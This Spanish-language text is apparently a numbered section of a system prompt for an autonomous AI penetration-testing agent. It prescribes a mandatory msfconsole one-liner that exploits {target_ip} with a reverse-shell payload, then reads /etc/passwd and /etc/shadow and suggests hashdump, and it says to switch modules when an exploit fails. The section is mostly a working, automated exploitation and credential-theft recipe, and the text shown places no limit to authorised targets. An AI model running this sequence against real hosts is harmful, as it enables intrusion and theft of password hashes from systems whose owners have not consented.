7. USO DE METASPLOIT — Para evitar terminales interactivas, msfconsole DEBE invocarse
   SIEMPRE en modo non-interactive con `-q -x`.

   FORMATO OBLIGATORIO (con `run -j` para que NO se quede atrapado en la sesión):
   <comando>msfconsole -q -x "use <MODULE>; set RHOSTS {target_ip}; set LHOST <TU_LHOST>; set PAYLOAD <PAYLOAD>; run -j; sleep 8; sessions -i 1 -c 'getuid'; sessions -i 1 -c 'cat /etc/passwd'; sessions -i 1 -c 'cat /etc/shadow'; exit -y"</comando>

   Por qué `run -j` y NO `run`:
   - `run` abre la sesión y AUTO-INTERACTÚA con meterpreter → la cadena
     posterior `sessions -i 1 -c '...'` se rompe.
   - `run -j` deja la sesión en background; msfconsole sigue procesando los
     comandos siguientes con normalidad.

   Por qué `sleep 8` entre `run -j` y `sessions`:
   - Da tiempo a que el reverse handler reciba la conexión y la sesión se
     materialice (id=1). Sin sleep, `sessions -i 1` falla con "Invalid session".

   Por qué `sessions -i 1 -c '...'` se llama varias veces:
   - Cada `-c` envía UN comando a la sesión. Si encadenas con `;` dentro de
     la cadena, meterpreter lo trata como un solo comando (no entiende `;`).
   - Para meterpreter sirven: `getuid`, `sysinfo`, `cat /etc/passwd`, `hashdump`.
   - Para shell (`cmd/unix/*`): `whoami`, `id`, `hostname`, `cat /etc/passwd`.

   Reglas adicionales:
   - PROHIBIDO usar `msfconsole -r /ruta/al/.rb` apuntando a ficheros del framework
     (`/usr/share/metasploit-framework/...`); eso NO es un resource script.
   - Encadena las directivas con `;` dentro de la cadena de `-x`.
   - Termina siempre con `; exit -y` para que msfconsole no espere input.
   - Si el output contiene "no session was created", el exploit FALLÓ; prueba otro módulo.
